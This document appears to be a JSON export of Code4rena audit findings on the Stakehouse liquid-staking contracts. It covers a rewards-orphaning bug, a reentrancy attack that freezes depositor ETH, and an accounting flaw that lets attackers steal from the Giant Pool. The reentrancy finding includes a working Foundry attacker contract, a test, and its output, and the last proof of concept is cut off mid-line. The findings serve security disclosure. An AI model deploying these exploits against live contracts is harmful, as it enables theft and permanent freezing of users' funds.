claimed[_user][_token];              if (due > 0) { -                claimed[_user][_token] = due; +                claimed[_user][_token] += due; // temp fix claimed calculation                    totalClaimed += due;   diff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.sol index 7e8bfdb..6468373 100644 --- a/test/foundry/GiantPools.t.sol +++ b/test/foundry/GiantPools.t.sol @@ -5,14 +5,18 @@ pragma solidity ^0.8.13;  import \"forge-std/console.sol\";  import { TestUtils } from \"../utils/TestUtils.sol\";   +import { MockLiquidStakingManager } from \"../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol\";  import { GiantSavETHVaultPool } from \"../../contracts/liquid-staking/GiantSavETHVaultPool.sol\";  import { GiantMevAndFeesPool } from \"../../contracts/liquid-staking/GiantMevAndFeesPool.sol\";  import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\"; +import { GiantLP } from \"../../contracts/liquid-staking/GiantLP.sol\";  import { MockSlotRegistry } from \"../../contracts/testing/stakehouse/MockSlotRegistry.sol\";  import { MockSavETHVault } from \"../../contracts/testing/liquid-staking/MockSavETHVault.sol\";  import { MockGiantSavETHVaultPool } from \"../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol\";  import { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";   +import \"forge-std/console.sol\"; +  contract GiantPoolTests is TestUtils {        MockGiantSavETHVaultPool public giantSavETHPool; @@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {          assertEq(dETHToken.balanceOf(savETHUser), 24 ether);      }   +    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) { +        manager = deployNewLiquidStakingNetwork( +            factory, +            admin, +            true, +            \"LSDN\" +        ); + +        savETHVault = MockSavETHVault(address(manager.savETHVault())); + +        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken()); + +        // Set up users and ETH +        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether); +        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether); + +        // Register BLS key +        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour); + +        // Deposit ETH into giant savETH +        vm.prank(savETHUser); +        giantSavETHPool.depositETH{value: 24 ether}(24 ether); +        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether); +        assertEq(address(giantSavETHPool).balance, 24 ether); + +        // Deploy ETH from giant LP into savETH pool of LSDN instance +        bytes[][] memory blsKeysForVaults = new bytes[][](1); +        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey); + +        uint256[][] memory stakeAmountsForVaults = new uint256[][](1); +        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether); + +        giantSavETHPool.batchDepositETHForStaking( +            getAddressArrayFromValues(address(manager.savETHVault())), +            getUint256ArrayFromValues(24 ether), +            blsKeysForVaults, +            stakeAmountsForVaults +        ); +        assertEq(address(manager.savETHVault()).balance, 24 ether); + +        assert(giantFeesAndMevPool.balance >= 4 ether); +        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether); +        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking( +            getAddressArrayFromValues(address(manager.stakingFundsVault())), +            getUint256ArrayFromValues(4 ether), +            blsKeysForVaults, +            stakeAmountsForVaults +        ); + +        // Ensure we can stake and mint derivatives +        stakeAndMintDerivativesSingleKey(blsPubKey); + +        return payable(manager); +    } + +    function testTransferDOSUserOrphansFutureRewards() public { + +        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether); +        address feesAndMevUserTwo = accountFour; + +       // Deposit ETH into giant fees and mev +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether); +        vm.stopPrank(); + +        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne)); +        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo)); + +        bytes[][] memory blsPubKeyOneInput = new bytes[][](1); +        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne); + +        bytes[][] memory blsPubKeyTwoInput = new bytes[][](1); +        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo); + +        vm.warp(block.timestamp + 3 hours); + +        // Add 2 eth rewards to manager1's staking funds vault. +        vm.deal(address(manager1.stakingFundsVault()), 2 ether); + +        // Claim rewards into the giant pool and distribute them to user one. +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.claimRewards( +            feesAndMevUserOne, +            getAddressArrayFromValues(address(manager1.stakingFundsVault())), +            blsPubKeyOneInput); +        vm.stopPrank(); + +        // User one has received all the rewards and has no more previewed rewards. +        assertEq(feesAndMevUserOne.balance, 2 ether); +        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether); +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserOne, +                new address[](0), +                new LPToken[][](0)), +                0); + +        // Check the claimed[] value for user 1. It is correct. +        assertEq( +            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())), +            2 ether); + +        // User one transfers half their giant tokens to user 2. +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether); +        vm.stopPrank(); + +        // After the tokens have been transferred to user 2, user 1's claimed[] remains +        // unchanged - and is higher than the accumulated payout per share for user 1's +        // current number of shares. +        assertEq( +            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())), +            2 ether); + +        // With this incorrect value of claimed[] causing a subtraction underflow, user one +        // cannot preview accumulated eth or perform any action that attempts to claim their +        // rewards such as transferring their tokens. +        vm.startPrank(feesAndMevUserOne); +        vm.expectRevert(); +        giantFeesAndMevPool.previewAccumulatedETH( +            feesAndMevUserOne, +            new address[](0), +            new LPToken[][](0)); + +        console.log(\"the revert expected now\"); +        GiantLP token = giantFeesAndMevPool.lpTokenETH(); +        vm.expectRevert(); +        token.transfer(feesAndMevUserTwo, 1 ether); +        vm.stopPrank(); + +        // Add 1 eth rewards to manager2's staking funds vault. +        vm.deal(address(manager2.stakingFundsVault()), 2 ether); + +        // User 2 claims rewards into the giant pool and obtains its 1/2 share. +        vm.startPrank(feesAndMevUserTwo); +        giantFeesAndMevPool.claimRewards( +            feesAndMevUserTwo, +            getAddressArrayFromValues(address(manager2.stakingFundsVault())), +            blsPubKeyTwoInput); +        vm.stopPrank(); +        assertEq(feesAndMevUserTwo.balance, 1 ether); + +        // At this point, user 1 ought to have accumulated 1 ether from the rewards, +        // however accumulated eth is listed as 0. +        // The reason is that when the giant pool tokens were transferred to +        // user two, the claimed[] value for user one was left unchanged. +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserOne, +                new address[](0), +                new LPToken[][](0)), +                0); + +        // The pool has received 4 eth rewards and paid out 3, but no users +        // are listed as having accumulated the eth. It is orphaned. +        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether); +        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether); + +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserTwo, +                new address[](0), +                new LPToken[][](0)), +                0); + +    } +  } \\ No newline at end of file  ``` ## Tools Used  ## Recommended Mitigation Steps Reduce claimed[] when necessary on the from side when GiantMevAndFeesPool tokens are transferred. Alternatively, claimed[] could be calculated on a per share basis rather than a total basis in order to simplify some of the adjustments that must be made in the code for claimed[]."}, {"title": "Protocol insolvent - Permanent freeze of funds", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-11"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524   # Vulnerability details  ## Impact  * Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users. * Protocol's LifecycleStatus state machine is broken   Other impacts: * Users deposit funds to an unstakable validator (node runner has already took out his funds)  Impact is also on the Giant Pools that give liquidity to the vaults.  A competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse. ## Proof of Concept  There are two main bugs that cause the above impact: 1. Reentrancy bug in `withdrawETHForKnot` function in `LiquidStakingManager.sol` 2. Improper balance check in `LiquidStakingManager.sol` for deposited node runner funds.   For easier reading and understanding, please follow the bellow full attack flow diagram when reading through the explanation. ``` \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510               \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502           \u2502               \u2502           \u2502            \u2502           \u2502              \u2502           \u2502 \u2502Node Runner\u2502               \u2502LSD Manager\u2502            \u2502   Vaults  \u2502              \u2502   Users   \u2502 \u2502           \u2502               \u2502           \u2502            \u2502           \u2502              \u2502           \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518               \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518              \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518       \u2502                           \u2502                        \u2502                          \u2502       \u2502   Register BLS Key #1     \u2502                        \u2502                          \u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                        \u2502                          \u2502       \u2502                           \u2502                        \u2502                          \u2502       \u2502   Register BLS Key #1     \u2502                        \u2502                          \u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                        \u2502Deposit 24 ETH to savETH  \u2502       \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502                           \u2502                        \u2502                          \u2502       \u2502                           \u2502                        \u2502Deposit 4 ETH to mevAndFees       \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u2502WithdrawETHForKnot BLS #1  \u2502                        \u2502                          \u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                        \u2502                          \u2502       \u2502       Send 4 ETH          \u2502                        \u2502                          \u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                        \u2502                          \u2502       \u2502 Reenter stake function    \u2502                        \u2502                          \u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502Get 28 ETH from vaults  \u2502                          \u2502       \u2502                           \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                          \u2502       \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502     Send 28 ETH        \u2502                          \u2502       \u2502 \u2502 Stake complete.       \u2502 \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                          \u2502       \u2502 \u2502status=DEPOSIT_COMPLETE\u2502 \u2502                        \u2502                          \u2502       \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502                        \u2502                          \u2502       \u2502Finished WithdrawETHForKnot\u2502                        \u2502                          \u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                        \u2502Users cannot mint derivati\u2502es       \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502                        \u2502Users cannot burnLPTokens \u2502       \u2502    \u2502BLS Key #1 banned \u2502   \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502                        \u2502Users cannot rotateTokens \u2502       \u2502                           \u2502                        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502                           \u2502                        \u2502                          \u2502 ```  Lets assume the following starting point: 1. Node runner registered and paid 4 ETH for BLS KEY #1 2. Node runner registered and paid 4 ETH for BLS KEY #2 3. savETH users collected 24 ETH ready for staking 4. mevAndFess users collected 4 ETH ready for staking   **Reentrancy in `withdrawETHForKnot`**:  `withdrawETHForKnot` is a function used in `LiquidStakingManager`. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.  `withdrawETHForKnot`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 ```     function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external { ....         IOwnableSmartWallet(associatedSmartWallet).rawExecute(             _recipient,             \"\",             4 ether         ); ....         bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;     } ```  The associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).   Please note: 1.  The Node Runner can reenter the `LiquidStakingManager` when receiving the 4 ETH 2. `bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;` is only executed after the reentrancy  We can call any method we need with the following states: * BLS key is NOT banned * Status is `IDataStructures.LifecycleStatus.INITIALS_REGISTERED`  The node runner will call the `stake` function to stake the deposited funds from the vaults and change the status to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  `stake`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524  ```     function stake(         bytes[] calldata _blsPublicKeyOfKnots,         bytes[] calldata _ciphertexts,         bytes[] calldata _aesEncryptorKeys,         IDataStructures.EIP712Signature[] calldata _encryptionSignatures,         bytes32[] calldata _dataRoots     ) external { ....             // check if BLS public key is registered with liquid staking derivative network and not banned             require(isBLSPublicKeyBanned(blsPubKey) == false, \"BLS public key is banned or not a part of LSD network\"); ....             require(                 getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,                 \"Initials not registered\"             ); ....             _assertEtherIsReadyForValidatorStaking(blsPubKey);              _stake(                 _blsPublicKeyOfKnots[i],                 _ciphertexts[i],                 _aesEncryptorKeys[i],                 _encryptionSignatures[i],                 _dataRoots[i]             ); ....     } ```  The `stake` function checks  1. That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy 2. IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.  3. There is enough balance in the vaults and node runners smart wallet in `_assertEtherIsReadyForValidatorStaking`  `_assertEtherIsReadyForValidatorStaking`  checks that the node runners smart wallet has more than 4 ETH.  Because our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.   `_assertEtherIsReadyForValidatorStaking` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934 ```     function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {         address associatedSmartWallet = smartWalletOfKnot[blsPubKey];         require(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");          LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);         require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");         require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");          LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);         require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");         require(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\");     } ```  Since we can pass all checks. `_stake` will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the `TransactionRouter` with 32 ETH needed for the stake. The `TransactionRouter` will process the funds and stake them. The `LifecycleStatus` will be updated to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  `_stake`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739 ```     function _stake(         bytes calldata _blsPublicKey,         bytes calldata _cipherText,         bytes calldata _aesEncryptorKey,         IDataStructures.EIP712Signature calldata _encryptionSignature,         bytes32 dataRoot     ) internal {         address smartWallet = smartWalletOfKnot[_blsPublicKey];          // send 24 ether from savETH vault to smart wallet         savETHVault.withdrawETHForStaking(smartWallet, 24 ether);          // send 4 ether from DAO staking funds vault         stakingFundsVault.withdrawETH(smartWallet, 4 ether);          // interact with transaction router using smart wallet to deposit 32 ETH         IOwnableSmartWallet(smartWallet).execute(             address(getTransactionRouter()),             abi.encodeWithSelector(                 ITransactionRouter.registerValidator.selector,                 smartWallet,                 _blsPublicKey,                 _cipherText,                 _aesEncryptorKey,                 _encryptionSignature,                 dataRoot             ),             32 ether         ); ....     } ```  After `_stake` and `stake` will finish executing we will finish the Cross-Function Reentrancy.   The protocol has entered the following state for the BLS key #1: 1. BLS Key #1 is banned 2. LifecycleStatus is `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  In such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:  `mintDerivatives`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577 ```     function mintDerivatives(         bytes[] calldata _blsPublicKeyOfKnots,         IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,         IDataStructures.EIP712Signature[] calldata _reportSignatures     ) external { ....             // check if BLS public key is registered and not banned             require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is banned or not a part of LSD network\"); .... ```  Vault LP Tokens cannot be burned for withdraws because that is not supported in DEPOSIT_COMPLETE state:  `burnLPToken`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126 ```     function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) { ...         bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];         IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);          require(             validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||             validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,             \"Cannot burn LP tokens\"         ); .... ```  Tokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state   `rotateLPTokens` ```     function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public { ...         bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken]; ...         require(             getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,             \"Lifecycle status must be one\"         ); ... ```  Funds are stuck, they cannot be taken or used.  The LifecycleStatus is also stuck, tokens cannot be minted.   ### Foundry POC:  The POC will showcase the scenario in the diagram.  Add the following contracts to `liquid-staking` folder: https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking ``` // SPDX-License-Identifier: MIT  pragma solidity 0.8.13;  import { LiquidStakingManager } from \"../../liquid-staking/LiquidStakingManager.sol\"; import { TestUtils } from \"../../../test/utils/TestUtils.sol\";  contract NodeRunner {     bytes blsPublicKey1;     LiquidStakingManager manager;     TestUtils testUtils;      constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {         manager = _manager;         blsPublicKey1 = _blsPublicKey1;         testUtils = TestUtils(_testUtils);         //register BLS Key #1         manager.registerBLSPublicKeys{ value: 4 ether }(             testUtils.getBytesArrayFromBytes(blsPublicKey1),             testUtils.getBytesArrayFromBytes(blsPublicKey1),             address(0xdeadbeef)         );         // Register BLS Key #2         manager.registerBLSPublicKeys{ value: 4 ether }(             testUtils.getBytesArrayFromBytes(_blsPublicKey2),             testUtils.getBytesArrayFromBytes(_blsPublicKey2),             address(0xdeadbeef)         );     }     receive() external payable {         testUtils.stakeSingleBlsPubKey(blsPublicKey1);     } } ```  Add the following imports to `LiquidStakingManager.t.sol` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12 ``` import { NodeRunner } from \"../../contracts/testing/liquid-staking/NodeRunner.sol\"; import { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\"; ```  Add the following test to `LiquidStakingManager.t.sol` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121 ```     function testLockStakersFunds() public {         uint256 startAmount = 8 ether;         // Create NodeRunner. Constructor registers two BLS Keys         address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));                  // Simulate state transitions in lifecycle status to initials registered (value of 1)         MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);          // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1         address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);                  // deposit savETHUser, feesAndMevUser funds for validator #1         depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);         depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);          // withdraw ETH for first BLS key and reenter         // This will perform a cross-function reentracy to call stake         vm.startPrank(nodeRunner);         manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);         // Simulate state transitions in lifecycle status to ETH deposited (value of 2)         // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE          MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);         vm.stopPrank();                  // Validate mintDerivatives reverts because of banned public key          (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();         (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();         vm.expectRevert(\"BLS public key is banned or not a part of LSD network\");         manager.mintDerivatives(             getBytesArrayFromBytes(blsPubKeyOne),             reports,             sigs         );          // Validate depositor cannot burn LP tokens         vm.startPrank(savETHUser);         vm.expectRevert(\"Cannot burn LP tokens\");         savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));         vm.stopPrank();     }  ```  To run the POC execute: `yarn test -m testLockStakersFunds -v `  Expected output: ``` Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testLockStakersFunds() (gas: 1731537) Test result: ok. 1 passed; 0 failed; finished in 8.21ms ```  To see the full trace, execute: `yarn test -m testLockStakersFunds -vvvv` ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  1. Add a reentrancy guard to `withdrawETHForKnot` and `stake` 2. Keep proper accounting for ETH deposited by node runner for each BLS key "}, {"title": "GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-10"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178   # Vulnerability details  ## Impact The contract GiantMevAndFeesPool override the function totalRewardsReceived: ``` return address(this).balance + totalClaimed - idleETH; ``` The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP` ``` uint256 received = totalRewardsReceived(); uint256 unprocessed = received - totalETHSeen; ```  The idleETH will be decreased in the function `batchDepositETHForStaking` for sending eth to the staking pool. But the idleETH wont be increased in the function `bringUnusedETHBackIntoGiantPool` which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.  ## Proof of Concept test: test/foundry/TakeFromGiantPools.t.sol ``` pragma solidity ^0.8.13;  // SPDX-License-Identifier: MIT  import \"forge-std/console.sol\"; import {GiantPoolTests} from \"./GiantPools.t.sol\"; import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";  contract TakeFromGiantPools is GiantPoolTests {     function testDWclaimRewards() public{         address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);         address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);         address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);          // Register BLS key         registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          // Deposit ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();         vm.startPrank(feesAndMevUserTwo);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);          bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);         giantFeesAndMevPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             getUint256ArrayFromValues(4 ether),             blsKeysForVaults,             stakeAmountsForVaults         );         vm.warp(block.timestamp+31 minutes);         LPToken[] memory tokens = new LPToken[](1);         tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);          LPToken[][] memory allTokens = new LPToken[][](1);         allTokens[0] = tokens;         giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             allTokens,             stakeAmountsForVaults         );         // inject a NOOP to skip some functions         address[] memory stakingFundsVaults = new address[](1);         bytes memory code = new bytes(1);         code[0] = 